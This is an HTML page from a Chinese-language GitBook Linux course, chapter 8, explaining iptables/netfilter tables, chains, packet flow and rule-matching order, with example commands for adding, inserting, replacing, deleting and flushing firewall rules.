<!DOCTYPE HTML>
<html lang="en" >
    
    <head>
        
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <title>第八节：iptables | Linux基础</title>
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <meta name="description" content="">
        <meta name="generator" content="GitBook 2.6.7">
        
        
        <meta name="HandheldFriendly" content="true"/>
        <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
        <meta name="apple-mobile-web-app-capable" content="yes">
        <meta name="apple-mobile-web-app-status-bar-style" content="black">
        <link rel="apple-touch-icon-precomposed" sizes="152x152" href="gitbook/images/apple-touch-icon-precomposed-152.png">
        <link rel="shortcut icon" href="gitbook/images/favicon.ico" type="image/x-icon">
        
    <link rel="stylesheet" href="gitbook/style.css">
    
        
        <link rel="stylesheet" href="gitbook/plugins/gitbook-plugin-highlight/website.css">
        
    
        
        <link rel="stylesheet" href="gitbook/plugins/gitbook-plugin-search/search.css">
        
    
        
        <link rel="stylesheet" href="gitbook/plugins/gitbook-plugin-fontsettings/website.css">
        
    
    

        
    
    
    <link rel="next" href="./di-jiu-jie-ff1a-zheng-ze-biao-da-shi.html" />
    
    
    <link rel="prev" href="./di-qi-jie-ff1a-shell-jiao-ben.html" />
    

        
    </head>
    <body>
        
        
    <div class="book"
        data-level="8"
        data-chapter-title="第八节：iptables"
        data-filepath="di-ba-jie-ff1a-iptables.md"
        data-basepath="."
        data-revision="Tue Jun 19 2018 15:42:49 GMT+0800 (中国标准时间)"
        data-innerlanguage="">
    

<div class="book-summary">
    <nav role="navigation">
        <ul class="summary">
            
            
            
            

            

            
    
        <li class="chapter " data-level="0" data-path="index.html">
            
                
                    <a href="./index.html">
                
                        <i class="fa fa-check"></i>
                        
                        介绍
                    </a>
            
            
        </li>
    
        <li class="chapter " data-level="1" data-path="chapter1.html">
            
                
                    <a href="./chapter1.html">
                
                        <i class="fa fa-check"></i>
                        
                            <b>1.</b>
                        
                        第一节：Linux基础1
                    </a>
            
            
        </li>
    
        <li class="chapter " data-level="2" data-path="di-er-jie-ff1a-linux-ji-chu-2.html">
            
                
                    <a href="./di-er-jie-ff1a-linux-ji-chu-2.html">
                
                        <i class="fa fa-check"></i>
                        
                            <b>2.</b>
                        
                        第二节：Linux基础2
                    </a>
            
            
        </li>
    
        <li class="chapter " data-level="3" data-path="di-san-jie-ff1a-linux-yong-hu-guan-li.html">
            
                
                    <a href="./di-san-jie-ff1a-linux-yong-hu-guan-li.html">
                
                        <i class="fa fa-check"></i>
                        
                            <b>3.</b>
                        
                        第三节：Linux用户管理
                    </a>
            
            
        </li>
    
        <li class="chapter " data-level="4" data-path="di-si-jie-ff1a-linux-shi-yong-ming-ling.html">
            
                
                    <a href="./di-si-jie-ff1a-linux-shi-yong-ming-ling.html">
                
                        <i class="fa fa-check"></i>
                        
                            <b>4.</b>
                        
                        第四节：Linux实用命令
                    </a>
            
            
        </li>
    
        <li class="chapter " data-level="5" data-path="di-wu-jie-ff1a-centos-ruan-jian-an-zhuang-yu-xie-zai.html">
            
                
                    <a href="./di-wu-jie-ff1a-centos-ruan-jian-an-zhuang-yu-xie-zai.html">
                
                        <i class="fa fa-check"></i>
                        
                            <b>5.</b>
                        
                        第五节：CentOS软件安装与卸载
                    </a>
            
            
        </li>
    
        <li class="chapter " data-level="6" data-path="di-liu-jie-ff1a-vim-shang-gu-shen-qi.html">
            
                
                    <a href="./di-liu-jie-ff1a-vim-shang-gu-shen-qi.html">
                
                        <i class="fa fa-check"></i>
                        
                            <b>6.</b>
                        
                        第六节：VIM-上古神器
                    </a>
            
            
        </li>
    
        <li class="chapter " data-level="7" data-path="di-qi-jie-ff1a-shell-jiao-ben.html">
            
                
                    <a href="./di-qi-jie-ff1a-shell-jiao-ben.html">
                
                        <i class="fa fa-check"></i>
                        
                            <b>7.</b>
                        
                        第七节：shell脚本
                    </a>
            
            
        </li>
    
        <li class="chapter active" data-level="8" data-path="di-ba-jie-ff1a-iptables.html">
            
                
                    <a href="./di-ba-jie-ff1a-iptables.html">
                
                        <i class="fa fa-check"></i>
                        
                            <b>8.</b>
                        
                        第八节：iptables
                    </a>
            
            
        </li>
    
        <li class="chapter " data-level="9" data-path="di-jiu-jie-ff1a-zheng-ze-biao-da-shi.html">
            
                
                    <a href="./di-jiu-jie-ff1a-zheng-ze-biao-da-shi.html">
                
                        <i class="fa fa-check"></i>
                        
                            <b>9.</b>
                        
                        第九节：正则表达式
                    </a>
            
            
        </li>
    
        <li class="chapter " data-level="10" data-path="di-shi-jie-ff1a-sed-he-awk.html">
            
                
                    <a href="./di-shi-jie-ff1a-sed-he-awk.html">
                
                        <i class="fa fa-check"></i>
                        
                            <b>10.</b>
                        
                        第十节：sed和awk
                    </a>
            
            
        </li>
    
        <li class="chapter " data-level="11" data-path="di-shi-yi-jie-ff1a-lnmp-jia-gou.html">
            
                
                    <a href="./di-shi-yi-jie-ff1a-lnmp-jia-gou.html">
                
                        <i class="fa fa-check"></i>
                        
                            <b>11.</b>
                        
                        第十一节：LNMP架构
                    </a>
            
            
        </li>
    


            
            <li class="divider"></li>
            <li>
                <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
                    Published with GitBook
                </a>
            </li>
            
        </ul>
    </nav>
</div>

    <div class="book-body">
        <div class="body-inner">
            <div class="book-header" role="navigation">
    <!-- Actions Left -->
    

    <!-- Title -->
    <h1>
        <i class="fa fa-circle-o-notch fa-spin"></i>
        <a href="./" >Linux基础</a>
    </h1>
</div>

            <div class="page-wrapper" tabindex="-1" role="main">
                <div class="page-inner">
                
                
                    <section class="normal" id="section-">
                    
                        <h1 id="linux&#x7684;&#x9632;&#x706B;&#x5899;&#xFF1A;iptables">linux&#x7684;&#x9632;&#x706B;&#x5899;&#xFF1A;iptables</h1>
<p>&#x540D;&#x8BCD;&#x89E3;&#x91CA;
dip|sip source(&#x6E90;) destination(&#x76EE;&#x7684;,&#x76EE;&#x6807;)
sport|dport</p>
<h2 id="netfilteriptables">netfilter(iptables)</h2>
<p>netfilter --&#x5DE5;&#x4F5C;&#x5728;&#x5185;&#x6838;&#x8F6F;&#x4EF6;&#xFF0C;&#x5B9E;&#x73B0;&#x6570;&#x636E;&#x5305;&#x7684;&#x8FC7;&#x6EE4;&#x3002;
iptables --&#x5DE5;&#x4F5C;&#x5E94;&#x7528;&#x5C42;&#x4E00;&#x4E2A;&#x8F6F;&#x4EF6;&#xFF0C;&#x7528;&#x6765;&#x63A7;&#x5236;netfilter&#x3002;
1.netfilter/iptables&#x5305;&#x8FC7;&#x6EE4;&#x9632;&#x706B;&#x5899;&#xFF08;tcp/ip&#x56DB;&#x5C42;&#xFF09;
1&#xFF09;&#x5E94;&#x7528;&#x5C42; &#xFF0D;&#xFF0D;&#x901A;&#x8FC7;&#x8F6F;&#x4EF6;&#x4E3A;&#x7528;&#x6237;&#x63D0;&#x4F9B;&#x63A5;&#x53E3;
2&#xFF09;&#x4F20;&#x8F93;&#x5C42; &#xFF0D;&#xFF0D;&#x63D0;&#x4F9B;&#x53EF;&#x9760;&#x6216;&#x4E0D;&#x53EF;&#x9760;&#x7684;&#x6570;&#x636E;&#x4F20;&#x8F93;&#xFF08;TCP&#xFF0F;UDP&#xFF09;&#x4F7F;&#x7528;&#x7AEF;&#x53E3;&#x6765;&#x6807;&#x793A;&#x670D;&#x52A1;&#x7C7B;&#x578B; sport dport
3&#xFF09;&#x7F51;&#x7EDC;&#x5C42; &#xFF0D;&#xFF0D;&#x63D0;&#x4F9B;&#x8DEF;&#x7531;&#x548C;&#x9009;&#x5740;(icmp) sip dip
4&#xFF09;&#x6570;&#x636E;&#x94FE;&#x8DEF;&#x5C42; &#xFF0D;&#xFF0D;&#x4F20;&#x8F93;&#x6570;&#x636E;&#x5E27;&#xFF08;MAC&#xFF09; s _mac arp&#x5199; &#x5728;&#x5C40;&#x57DF;&#x7F51;&#x5185;&#x6CDB;&#x6D2A; &#x6765;&#x627E;&#x5230;&#x6211;&#x4EEC;&#x5BF9;&#x5E94;&#x7684;MAC
5&#xFF09;&#x7269;&#x7406;&#x5C42; &#xFF0D;&#xFF0D;&#x4F20;&#x8F93;&#x900F;&#x660E;&#x6BD4;&#x7279;&#x6D41; eth0 eth1
&#x8FC7;&#x6EE4;&#x7684;&#x4F9D;&#x636E;&#xFF1A; s_mac/sip/dip/sport/dport/&#x72B6;&#x6001;&#xFF08;&#x4E09;&#x6B21;&#x63E1;&#x624B;/&#x56DB;&#x6B21;&#x65AD;&#x5F00;&#xFF09;SYN DDOS&#x653B;&#x51FB;&#x600E;&#x4E48;&#x9632;&#x5FA1;&#x6211;&#x4EEC;DDOS &#x5C0F;&#x6D41;&#x91CF;
netfilter&#x7684;&#x903B;&#x8F91;&#x67B6;&#x6784;&#xFF1A; nat 10
<img src="https://upload-images.jianshu.io/upload_images/7342323-123fb02ff3af02bf?imageMogr2/auto-orient/strip%7CimageView2/2/w/700" alt=""></p>
<p>netfilter&#x9632;&#x706B;&#x5899;&#x7684;&#x5143;&#x7D20;&#x53CA;&#x5173;&#x7CFB;:
netfilter==&gt;&#x8868;==&gt;&#x94FE;==&gt;&#x89C4;&#x5219;</p>
<h2 id="&#x4E09;&#x5F20;&#x8868;&#xFF1A;">&#x4E09;&#x5F20;&#x8868;&#xFF1A;</h2>
<p>filter &#x9632;&#x706B;&#x5899;&#x8868;&#xFF0C;&#x5141;&#x8BB8;&#x548C;&#x62D2;&#x7EDD;&#x90FD;&#x5728;&#x8FD9;&#x91CC;&#x5B9E;&#x73B0;
nat &#x5730;&#x5740;&#x8F6C;&#x6362;
mangle &#x6570;&#x636E;&#x5305;&#x6574;&#x5F62;</p>
<h2 id="&#x4E94;&#x6761;&#x94FE;&#xFF1A;">&#x4E94;&#x6761;&#x94FE;&#xFF1A;</h2>
<p>INPUT &#x672C;&#x673A;&#x8FDB;&#x7AD9;&#x7684;&#x6570;&#x636E;&#x6D41;
OUTPUT &#x672C;&#x673A;&#x51FA;&#x7AD9;&#x7684;&#x6570;&#x636E;&#x6D41;
FORWARD &#x8DEF;&#x7531;&#x7684;&#x6570;&#x636E;&#x6D41;
POSTROUTING &#x8DEF;&#x7531;&#x540E;&#x7684;&#x6570;&#x636E;&#x6D41;
PREROUTING &#x8DEF;&#x7531;&#x524D;&#x7684;&#x6570;&#x636E;&#x6D41;</p>
<h2 id="&#x8868;&#x8DDF;&#x94FE;&#x7684;&#x5BF9;&#x5E94;&#x5173;&#x7CFB;&#xFF1A;">&#x8868;&#x8DDF;&#x94FE;&#x7684;&#x5BF9;&#x5E94;&#x5173;&#x7CFB;&#xFF1A;</h2>
<p>filter:INPUT,OUTPUT,FORWARD
nat: OUTPUT,PREROUTING,POSTROUTING</p>
<h2 id="mangleinputoutputforwardpreroutingpostrouting">mangle:INPUT,OUTPUT,FORWARD,PREROUTING,POSTROUTING</h2>
<h3 id="&#x56DB;&#x79CD;&#x6570;&#x636E;&#x6D41;&#xFF1A;">&#x56DB;&#x79CD;&#x6570;&#x636E;&#x6D41;&#xFF1A;</h3>
<p>&#x672C;&#x673A;&#x8FDB;&#x7AD9;&#x7684;&#x6570;&#x636E;&#x6D41;&#xFF1A;packet--&gt;ethX--&gt;PREROUTING--&gt;INPUT--&gt;&#x672C;&#x673A;
&#x672C;&#x673A;&#x51FA;&#x7AD9;&#x7684;&#x6570;&#x636E;&#x6D41;&#xFF1A;packet--&gt;OUTPUT--&gt;POSTROUTING--&gt;ethX--&gt;destination
&#x8DEF;&#x7531;&#x7684;&#x6570;&#x636E;&#x6D41;&#xFF1A;
&#x51FA;&#x53BB;&#xFF1A; packet--&gt;eth0--&gt;PREROUTING--&gt;FORWARD--&gt;POSTROUTING--&gt;eth1--destination
&#x56DE;&#x6765;&#xFF1A; packet--&gt;eth1--&gt;PREROUTING--&gt;FORWARD--&gt;POSTROUTING--&gt;eth0--destination
&#x672C;&#x673A;&#x8BBF;&#x95EE;&#x672C;&#x673A;&#xFF1A; &#x672C;&#x673A;--&gt;packet--&gt;lo--&gt;PREROUTING--&gt;INPUT--&gt;&#x672C;&#x673A;</p>
<p>&#x672C;&#x673A;--&gt;packet--&gt;OUTPUT--&gt;POSTROUTING--lo--&gt;&#x672C;&#x673A;</p>
<h2 id="&#x8868;&#x7684;&#x5339;&#x914D;&#x987A;&#x5E8F;">&#x8868;&#x7684;&#x5339;&#x914D;&#x987A;&#x5E8F;:</h2>
<p>mangle--&gt;nat--&gt;filter</p>
<h2 id="&#x9632;&#x706B;&#x5899;&#x89C4;&#x5219;&#x5339;&#x914D;&#x987A;&#x5E8F;">&#x9632;&#x706B;&#x5899;&#x89C4;&#x5219;&#x5339;&#x914D;&#x987A;&#x5E8F;:</h2>
<p>1.&#x6309;&#x987A;&#x5E8F;&#x5339;&#x914D;,&#x5982;&#x679C;&#x7B2C;&#x4E00;&#x6761;&#x5339;&#x914D;&#x5230;&#x4E86;&#x5C31;&#x76F4;&#x63A5;&#x6267;&#x884C;&#x8FD9;&#x6761;&#x89C4;&#x5219;&#x7684;&#x52A8;&#x4F5C;,&#x4E0D;&#x5F80;&#x4E0B;&#x5339;&#x914D;&#x5176;&#x5B83;&#x89C4;&#x5219;.</p>
<p>2.&#x5982;&#x679C;&#x7B2C;&#x4E00;&#x6761;&#x5339;&#x914D;&#x4E0D;&#x5230;,&#x7B2C;&#x4E8C;&#x6761;&#x4E5F;&#x5339;&#x914D;&#x4E0D;&#x5230;,&#x7EE7;&#x7EED;&#x5F80;&#x4E0B;&#x5339;&#x914D;&#x76F4;&#x5230;&#x627E;&#x5230;&#x5339;&#x914D;&#x7684;&#x89C4;&#x5219;,&#x5982;&#x679C;&#x627E;&#x4E0D;&#x5230;&#x5339;&#x914D;&#x9ED8;&#x8BA4;&#x89C4;&#x5219;.
&#x4F20;&#x8F93;&#x5C42;&#xFF1A;&#x534F;&#x8BAE;&#xFF08;tcp/udp&#xFF09;
&#x7AEF;&#x53E3;&#xFF08;sport/dport&#xFF09;
&#x7F51;&#x7EDC;&#x5C42;&#xFF1A;
IP&#x5730;&#x5740;&#xFF08;sip/dip/icmp&#xFF09; ping
&#x6570;&#x636E;&#x94FE;&#x8DEF;&#x5C42;&#xFF1A;
mac&#x5730;&#x5740;&#xFF08;--mac-source&#xFF09;
&#x7269;&#x7406;&#x5C42;&#xFF1A;
&#x4ECE;&#x54EA;&#x4E2A;&#x7F51;&#x5361;&#x8FDB;&#x6765; -i eth0 eth1 &#x670D;&#x52A1;&#x5668;2&#x4E2A;&#x5730;&#x5740; &#x5916;&#x7F51;&#x5730;&#x5740; &#x4E00;&#x4E2A;&#x5185;&#x7F51;&#x5730;&#x5740;</p>
<h2 id="iptables&#x64CD;&#x4F5C;&#x547D;&#x4EE4;">iptables&#x64CD;&#x4F5C;&#x547D;&#x4EE4;</h2>
<pre><code class="lang-bash"><span class="hljs-comment">#iptables --help</span>
Usage: iptables -[AD] chain rule-specification [options]
       iptables -[RI] chain rulenum rule-specification [options]
       iptables -D chain rulenum [options]
       iptables -[LFZ] [chain] [options]
       iptables -[NX] chain
       iptables -E old-chain-name new-chain-name
       iptables -P chain target [options]
       iptables -h (<span class="hljs-built_in">print</span> this <span class="hljs-built_in">help</span> information)

  --append  -A chain            &#x8FFD;&#x52A0;&#x89C4;&#x5219;
  --delete  -D chain            &#x5220;&#x9664;&#x89C4;&#x5219;
  --delete  -D chain rulenum    &#x5220;&#x9664;&#x6307;&#x5B9A;&#x5E8F;&#x53F7;&#x7684;&#x89C4;&#x5219;

  --insert  -I chain [rulenum]  &#x63D2;&#x5165;&#x4E00;&#x6761;&#x89C4;&#x5219;(default <span class="hljs-number">1</span>=first) &#x63D2;&#x5165;&#x4F1A;&#x63D2;&#x5165;&#x8868;&#x7684;&#x7B2C;&#x4E00;&#x884C;
  --replace -R chain rulenum    &#x66FF;&#x6362;&#x4E00;&#x6761;&#x89C4;&#x5219;

  --list    -L [chain]          &#x663E;&#x793A;&#x51FA;&#x94FE;&#x6216;&#x8005;&#x94FE;&#x4E2D;&#x7684;&#x89C4;&#x5219;
  --flush   -F [chain]          &#x5728;&#x4E00;&#x4E2A;&#x94FE;&#x6216;&#x8005;&#x6240;&#x6709;&#x94FE;&#x4E2D;&#x6E05;&#x7A7A;&#x89C4;&#x5219;
  --zero    -Z [chain]          &#x6E05;&#x7A7A;&#x8BA1;&#x6570;
  --new     -N chain            &#x521B;&#x5EFA;&#x7528;&#x6237;&#x81EA;&#x5B9A;&#x4E49;&#x94FE;
  --delete-chain
            -X [chain]          &#x5220;&#x9664;&#x7528;&#x6237;&#x81EA;&#x5B9A;&#x4E49;&#x94FE;
  --policy  -P chain target     &#x6307;&#x5B9A;&#x9ED8;&#x8BA4;&#x89C4;&#x5219;
                                Change policy on chain to target
  --rename-chain
            -E old-chain new-chain
                                     &#x91CD;&#x547D;&#x540D;&#x7528;&#x6237;&#x81EA;&#x5B9A;&#x4E49;&#x94FE;
Options:
  --proto       -p [!] proto    &#x6307;&#x5B9A;&#x534F;&#x8BAE;,!&#x4EE3;&#x8868;&#x53D6;&#x53CD;
  --source      <span class="hljs-operator">-s</span> [!] address[/mask]   --&#x6307;&#x5B9A;&#x6E90;&#x5730;&#x5740;
                                <span class="hljs-built_in">source</span> specification
  --destination <span class="hljs-operator">-d</span> [!] address[/mask]   --&#x6307;&#x5B9A;&#x76EE;&#x6807;&#x5730;&#x5740;
                                destination specification
  --in-interface -i [!] input name[+]   --&#x6307;&#x5B9A;&#x6570;&#x636E;&#x4ECE;&#x54EA;&#x4E2A;&#x7F51;&#x53E3;&#x8FDB;&#x6765;
                                network interface name ([+] <span class="hljs-keyword">for</span> wildcard)
  --jump        -j target                       --&#x5339;&#x914D;&#x52A8;&#x4F5C;
                                target <span class="hljs-keyword">for</span> rule (may load target extension)
  --goto      -g chain
                              jump to chain with no <span class="hljs-built_in">return</span>
  --match       -m match                        --&#x6269;&#x5C55;&#x5339;&#x914D;
                                extended match (may load extension)
  --numeric     -n              --&#x7AEF;&#x53E3;&#x548C;IP&#x4EE5;&#x6570;&#x503C;&#x65B9;&#x5F0F;&#x663E;&#x793A;,&#x4E0D;&#x4F5C;&#x53CD;&#x89E3;
  --out-interface -o [!] output name[+] --&#x6307;&#x5B9A;&#x6570;&#x636E;&#x4ECE;&#x54EA;&#x4E2A;&#x7F51;&#x53E3;&#x51FA;&#x53BB;
                                network interface name ([+] <span class="hljs-keyword">for</span> wildcard)
  --table       -t table        --&#x6307;&#x5B9A;&#x4F7F;&#x7528;&#x54EA;&#x4E2A;&#x8868; (default: `filter<span class="hljs-string">&apos;)
  --verbose     -v              --&#x663E;&#x793A;&#x8BE6;&#x7EC6;&#x4FE1;&#x606F;
  --line-numbers                --&#x663E;&#x793A;&#x89C4;&#x5219;&#x7684;&#x5E8F;&#x53F7;
  --exact       -x              expand numbers (display exact values)
</span></code></pre>
<h2 id="&#x67E5;&#x770B;">&#x67E5;&#x770B;</h2>
<pre><code class="lang-bash"><span class="hljs-comment"># iptables -t nat -L -n -v --line</span>
<span class="hljs-comment"># iptables -t filter -L -n</span>
<span class="hljs-comment"># iptables -t filter -L INPUT</span>
<span class="hljs-comment"># iptables -t filter -L INPUT -v -n</span>
<span class="hljs-comment"># iptables -t filter -L INPUT -n -v --line</span>
<span class="hljs-comment"># watch -n 0.1 iptables -L INPUT --line -n -v</span>
iptables -nv -L
</code></pre>
<h2 id="&#x8FFD;&#x52A0;-&#x63D2;&#x5165;-&#x66FF;&#x6362;-&#x5220;&#x9664;">&#x8FFD;&#x52A0; &#x63D2;&#x5165; &#x66FF;&#x6362; &#x5220;&#x9664;</h2>
<p>&#x8FFD;&#x52A0;&#x89C4;&#x5219;&#xFF1A;</p>
<pre><code># iptables -t filter -A INPUT -i lo -j ACCEPT
</code></pre><p>&#x63D2;&#x5165;&#x89C4;&#x5219;&#xFF1A;</p>
<pre><code># iptables -t filter -I INPUT -i eth0 -j ACCEPT     &#xFF0D;&#xFF0D;&#x63D2;&#x5165;&#x6210;&#x4E3A;&#x7B2C;&#x4E00;&#x6761;
# iptables -t filter -I INPUT 3 -i eth0 -j ACCEPT       &#xFF0D;&#xFF0D;&#x63D2;&#x5165;&#x6210;&#x4E3A;&#x7B2C;&#x4E09;&#x6761;&#x89C4;&#x5219;
</code></pre><p>&#x66FF;&#x6362;&#x89C4;&#x5219;&#xFF1A;</p>
<pre><code># iptables -t filter -R INPUT 3 -i eth1 -j ACCEPT       &#xFF0D;&#xFF0D;&#x66FF;&#x6362;&#x6210;&#x4E3A;&#x6307;&#x5B9A;&#x89C4;&#x5219;
</code></pre><p>&#x5220;&#x9664;&#x89C4;&#x5219;&#xFF1A;</p>
<pre><code># iptables -t filter -D INPUT 2                 &#xFF0D;&#xFF0D;&#x5220;&#x9664;&#x6307;&#x5B9A;&#x94FE;&#x6307;&#x5B9A;&#x7F16;&#x53F7;&#x7684;&#x89C4;&#x5219;


+++++++++++
#iptables -t filter -A INPUT -i lo -j ACCEPT
#iptables -t filter -A OUTPUT -o lo -j ACCEPT
#iptables -t filter -A INPUT -i eth0 -s 192.168.0.0/24 -d 192.168.0.250 -j ACCEPT
# iptables -t filter -A INPUT -i eth1 -j ACCEPT
# iptables -L INPUT -n --line -v
# iptables -t filer -I INPUT 2 -i eth2 -j ACCEPT   &#x63D2;&#x5165;&#x9ED8;&#x8BA4;&#x7B2C;&#x4E8C;&#x6761;
# iptables -t filter -I INPUT  -i eth3 -j ACCEPT    &#x63D2;&#x5165;&#x9ED8;&#x8BA4;&#x7B2C;&#x4E00;&#x6761;
# iptables -t filter -R INPUT 1 -i eth4 -j ACCEPT  &#x66FF;&#x6362;&#x9ED8;&#x8BA4;&#x7B2C;&#x4E00;&#x6761;
#iptables -t filter -D INPUT 1                  &#x5220;&#x9664;&#x9ED8;&#x8BA4;&#x7B2C;&#x4E00;&#x6761;
# iptables -t filter -F INPUT                   &#x6E05;&#x7A7A;filter&#x6240;&#x6709;INPUT&#x94FE;
#iptables -t filter -F              

#iptables -L INPUT -n --line -v
</code></pre><p>&#x7A7A;&#x89C4;&#x5219;&#xFF1A;</p>
<pre><code>    1&#x3001;&#x6E05;&#x7A7A;&#x4E00;&#x5F20;&#x8868;
# iptables -t filter -F
&#x6CE8;&#x610F;&#x4E0D;&#x4F1A;&#x6E05;&#x9664;&#x9ED8;&#x8BA4;&#x89C4;&#x5219;

    2&#x3001;&#x6E05;&#x7A7A;&#x4E00;&#x6761;&#x94FE;&#x4E2D;&#x7684;&#x89C4;&#x5219;
# iptables -t filter -F INPUT
</code></pre><p>&#x65B0;&#x5EFA;/&#x5220;&#x9664;&#x7528;&#x6237;&#x81EA;&#x5B9A;&#x4E49;&#x7684;&#x94FE;&#xFF1A;</p>
<pre><code># iptables -t filter -N uplooking   &#x65B0;&#x5EFA;
# iptables -t filter -X uplooking       &#x5220;&#x9664;
# iptables -t filter -X             &#x6E05;&#x7A7A;filter&#x8868;&#x4E2D;&#x6240;&#x6709;&#x7528;&#x6237;&#x81EA;&#x5B9A;&#x4E49;&#x94FE;
+++++++++
iptables -t filter -N TCP
iptables -t filter -N UDP
iptables -t filter -A INPUT -i lo -j ACCEPT
iptables -t filter -A INPUT -p tcp -j TCP
++++++++
</code></pre><p>&#x66F4;&#x6539;&#x9ED8;&#x8BA4;&#x89C4;&#x5219;&#xFF1A;</p>
<pre><code># iptables -t filter -P INPUT ACCEPT
# iptables -t filter -P INPUT DROP
</code></pre><h2 id="iptables&#x6269;&#x5C55;&#x5339;&#x914D;">iptables&#x6269;&#x5C55;&#x5339;&#x914D;</h2>
<ol>
<li>iptables(user space)/netfilter(kernel space)</li>
<li>netfilter&#x7EC4;&#x6210;&#xFF08;&#x8868;(&#x529F;&#x80FD;&#x6A21;&#x5757;)&#xFF0F;&#x94FE;&#xFF0F;&#x89C4;&#x5219;&#xFF09;
filter&#xFF08;INPUT/OUTPUT/FORWARD&#xFF09; &#x8FC7;&#x6EE4;
nat(PREROUTING/POSTROUTING/OUTPUT) &#x5730;&#x5740;&#x8F6C;&#x6362;
mangle(5&#x4E2A;&#x94FE; ) &#x66F4;&#x5C01;&#x88C5;&#x5C42;&#x6570;&#x636E;&#x5305;&#x7ED3;&#x6784;
--&gt;PREROUTING--&gt;FORWARD--&gt;POSTROUTING--&gt;
INPUT | | OUTPUT
&#x672C;&#x673A;<h3 id="&#x89C4;&#x5219;&#x7684;&#x5339;&#x539F;&#x5219;&#xFF1A;">&#x89C4;&#x5219;&#x7684;&#x5339;&#x539F;&#x5219;&#xFF1A;</h3>
1&#x3001;&#x81EA;&#x4E0A;&#x800C;&#x4E0B;&#x6309;&#x987A;&#x5E8F;&#x5339;&#x914D;
2&#x3001;&#x5982;&#x679C;&#x5339;&#x914D;&#x5230;&#x67D0;&#x6761;&#x89C4;&#x5219;&#xFF0C;&#x6267;&#x884C;&#x8FD9;&#x4E2A;&#x89C4;&#x5219;&#x52A8;&#x4F5C;&#xFF0C;&#x5C31;&#x4E0D;&#x5F80;&#x540E;&#x5339;&#x914D;&#x5176;&#x5B83;&#x89C4;&#x5219;
3&#x3001;&#x5982;&#x679C;&#x5217;&#x8868;&#x7684;&#x6240;&#x6709;&#x7684;&#x89C4;&#x5219;&#x90FD;&#x5339;&#x914D;&#x4E0D;&#x5230;&#xFF0C;&#x5219;&#x5339;&#x914D;&#x9ED8;&#x8BA4;&#x89C4;&#x5219;
iptables [-t talbe] -A | -I | -D | -R | -E chian option(-s -d -i -o -p --dport -m) -j action(ACCEPT/DROP/REJECT/SNAT/DNAT....)
ACCEPT &#x63A5;&#x53D7;
DROP &#x6084;&#x6084;&#x4E22;&#x5F03;
REJECT &#x660E;&#x793A;&#x62D2;&#x7EDD;
SNAT &#x57FA;&#x4E8E;&#x6E90;&#x5730;&#x5740;&#x7684;nat&#x8F6C;&#x6362;&#xFF0C;&#x5176;&#x4F5C;&#x7528;&#x662F;&#x5C06;ip&#x6570;&#x636E;&#x5305;&#x7684;&#x6E90;&#x5730;&#x5740;&#x8F6C;&#x6362;&#x6210;&#x53E6;&#x5916;&#x4E00;&#x4E2A;&#x5730;&#x5740;
DNAT &#x76EE;&#x7684;&#x5730;&#x5740;&#x8F6C;&#x6362; &#x5176;&#x4F5C;&#x7528;&#x662F;&#x5C06;ip&#x6570;&#x636E;&#x5305;&#x7684;&#x76EE;&#x6807;&#x5730;&#x5740;&#x8F6C;&#x6362;&#x6210;&#x53E6;&#x5916;&#x4E00;&#x4E2A;&#x5730;&#x5740;
&#x5E94;&#x7528;&#x5C42;
&#x4F20;&#x8F93;&#x5C42;(tcp/udp/sport/doprt/ tcp6&#x4E2A;&#x63A7;&#x5236;&#x4F4D;&#x5339;&#x914D;)
&#x7F51;&#x7EDC;&#x5C42;(-s/-d/icmp)
&#x6570;&#x636E;&#x94FE;&#x8DEF;&#x5C42;(mac)
&#x7269;&#x7406;&#x5C42;&#xFF08;-i/-o&#xFF09;</li>
</ol>
<h3 id="&#x6269;&#x5C55;&#x5339;&#x914D;">&#x6269;&#x5C55;&#x5339;&#x914D;</h3>
<p>1&#x3001;&#x901A;&#x7528;&#x5339;&#x914D; -i -o -s -d
-i eth0 &#x4ECE;&#x8FD9;&#x5757;&#x7F51;&#x5361;&#x6D41;&#x5165;&#x7684;&#x6570;&#x636E; &#x6D41;&#x5165;&#x4E00;&#x822C;&#x7528;INPUT&#x548C;PREROUING
-o eth0 &#x4ECE;&#x8FD9;&#x5757;&#x7F51;&#x5361;&#x6D41;&#x51FA;&#x7684;&#x6570;&#x636E; &#x6D41;&#x51FA;&#x4E00;&#x822C;&#x5728;OUTPUT&#x548C;PSOTROUTING
-s &#x6E90;IP
-d &#x76EE;&#x6807;IP
2&#x3001;&#x9690;&#x542B;&#x5339;&#x914D; tcp udp icmp sport dport
3&#x3001;&#x6269;&#x5C55;&#x5339;&#x914D; -m mac | iprange | state
-m multiport&#xFF1A;&#x8868;&#x793A;&#x542F;&#x7528;&#x591A;&#x7AEF;&#x53E3;&#x6269;&#x5C55; &#x4E4B;&#x540E;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x542F;&#x7528;&#x6BD4;&#x5982; --dports 21,23,80,8080-8100, 3306
&#x5E38;&#x7528;&#x7684;ACTION&#xFF1A; -j
DROP&#xFF1A;&#x6084;&#x6084;&#x4E22;&#x5F03; nmap
&#x4E00;&#x822C;&#x6211;&#x4EEC;&#x591A;&#x7528;DROP&#x6765;&#x9690;&#x85CF;&#x6211;&#x4EEC;&#x7684;&#x8EAB;&#x4EFD;&#xFF0C;&#x4EE5;&#x53CA;&#x9690;&#x85CF;&#x6211;&#x4EEC;&#x7684;&#x94FE;&#x8868;
REJECT&#xFF1A;&#x660E;&#x793A;&#x62D2;&#x7EDD;
ACCEPT&#xFF1A;&#x63A5;&#x53D7;
custom_chain&#xFF1A;&#x8F6C;&#x5411;&#x4E00;&#x4E2A;&#x81EA;&#x5B9A;&#x4E49;&#x7684;&#x94FE;
DNAT
SNAT
MASQUERADE&#xFF1A;&#x6E90;&#x5730;&#x5740;&#x4F2A;&#x88C5; nat&#x5B9E;&#x9A8C;&#x7684;&#x65F6;&#x5019;
REDIRECT&#xFF1A;&#x91CD;&#x5B9A;&#x5411;&#xFF1A;&#x4E3B;&#x8981;&#x7528;&#x4E8E;&#x5B9E;&#x73B0;&#x7AEF;&#x53E3;&#x91CD;&#x5B9A;&#x5411;
MARK&#xFF1A;&#x6253;&#x9632;&#x706B;&#x5899;&#x6807;&#x8BB0;&#x7684;
RETURN&#xFF1A;&#x8FD4;&#x56DE;
